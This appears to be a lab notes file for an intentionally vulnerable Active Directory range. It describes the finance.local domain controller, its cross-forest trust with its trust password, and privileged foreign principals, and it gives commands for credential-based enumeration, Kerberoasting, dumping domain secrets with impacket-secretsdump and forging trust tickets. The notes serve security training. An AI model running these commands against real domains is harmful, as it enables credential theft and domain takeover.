# dc01.finance.local — 10.20.0.10

Forest root of `finance.local`. External / forest trust with `corp.local` (trust key = `TrustKey2024!`). Foreign Security Principals from CORP have privileged group memberships here.

## Listening ports

Standard DC: 53, 88, 135, 137-139, 389, 445, 464, 636, 3268-3269, 3389, 5985, 9389. No null-session pipes wired here (gap vs dc01.corp).

## Users / groups / FSP

- `fin_user1`, `fin_user2`
- `fin_svc` SPN `HTTP/finance.local`
- Group `Finance Admins`
- **Foreign Security Principals (cross-forest):**
  - `CORP\Administrator` → `Domain Admins` (DF-009)
  - `CORP\Administrator` → `IT Admins` (LAT-034)
  - `CORP\helpdesk` → `Server Operators` (DF-038)

## Trust

External / forest trust from `corp.local` ↔ `finance.local`. Trust account password is `TrustKey2024!`.

## Minimum enum sweep

```bash
F=10.20.0.10
# From corp.local foothold:
nxc ldap $F -u alice@corp.local -p 'DVADlab2024!' --trusted-domains
ldapsearch -x -H ldap://$F -D 'corp\alice' -w 'DVADlab2024!' \
    -b "DC=finance,DC=local" "(objectClass=foreignSecurityPrincipal)"
nxc smb,ldap $F -u alice@corp.local -p 'DVADlab2024!' \
    --kerberoasting fin_kerb.txt --asreproast fin_asrep.txt
# Once you have CORP/Administrator NT hash:
impacket-secretsdump -k -no-pass -just-dc \
    -target-ip $F finance.local/Administrator@dc01.finance.local
# Trust-key forge (DF-006):
impacket-ticketer -nthash <TRUSTKEY_NT> -domain-sid S-1-5-21-CORP \
    -domain corp.local -spn 'krbtgt/finance.local' Administrator
```

## Forward to

DF-006 trust-ticket abuse, DF-008 SID filter bypass, DF-009 FSP hijack, DF-010 cross-forest Kerberoast, DF-037.
